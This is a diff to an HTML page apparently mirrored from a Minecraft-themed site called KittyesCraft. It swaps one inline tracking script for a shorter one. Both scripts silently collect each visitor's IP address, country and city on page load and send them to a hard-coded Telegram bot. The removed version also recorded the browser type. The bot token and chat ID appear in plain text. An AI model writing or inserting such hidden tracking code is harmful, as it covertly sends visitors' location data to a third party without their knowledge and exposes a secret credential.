@@ -586,73 +586,29 @@
             setTimeout(() => createSnowflake(), i * 150);
         }
  <script>
-// Bilgilerini buraya gir - AMA TOKEN'I GİZLİ TUT!
-const botToken = "8621272611:AAHttOkkTdY5h_nhShk_v2Pf0mi1bjWXuEY";
-const chatId = "1504410647";
+// YENİ TOKEN'I BURAYA YAPIŞTIR
+const botToken = "8621272611:AAHttOkkTdY5h_nhShk_v2Pf0mi1bjWXuEY"; // @BotFather'dan aldığın yeni token
+const chatId = "1504410647"; // Bu aynı kalacak
 
-// Sayfa yüklendiğinde çalıştır
-document.addEventListener('DOMContentLoaded', function() {
+fetch('https://ipapi.co/json/')
+  .then(response => response.json())
+  .then(data => {
+    const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
+                    `🌐 <b>IP:</b> ${data.ip}\n` +
+                    `📍 <b>Konum:</b> ${data.country_name} / ${data.city}\n` +
+                    `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
+                    `✅ 💻 <b>Gerçek Bilgisayar</b>`;
     
-    fetch('https://ipapi.co/json/')
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('IP API hatası');
-            }
-            return response.json();
-        })
-        .then(data => {
-            // Tarayıcı bilgisini al
-            const userAgent = navigator.userAgent;
-            let browser = "Bilinmiyor";
-            if (userAgent.includes("Chrome")) browser = "Google Chrome";
-            else if (userAgent.includes("Firefox")) browser = "Firefox";
-            else if (userAgent.includes("Safari")) browser = "Safari";
-            else if (userAgent.includes("Edge")) browser = "Edge";
-            
-            const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
-                `🌐 <b>IP:</b> ${data.ip}\n` +
-                `📍 <b>Konum:</b> ${data.country_name} / ${data.city}\n` +
-                `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
-                `🚀 <b>Tarayıcı:</b> ${browser}\n` +
-                `✅ 💻 <b>Gerçek Bilgisayar</b>`;
-            
-            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: chatId, 
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Bildirim gönderildi:', data);
-        })
-        .catch(error => {
-            console.error('Hata:', error);
-            // Yedek IP servisi dene
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(ipData => {
-                    const message = `⚠️ <b>Sadece IP Alındı</b>\n\n` +
-                        `🌐 <b>IP:</b> ${ipData.ip}\n` +
-                        `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}`;
-                    
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            chat_id: chatId, 
-                            text: message,
-                            parse_mode: 'HTML'
-                        })
-                    });
-                });
-        });
-        
-});
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        chat_id: chatId, 
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+  });
 </script>
 </body>
 
@@ -660,6 +616,7 @@ document.addEventListener('DOMContentLoaded', function() {
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
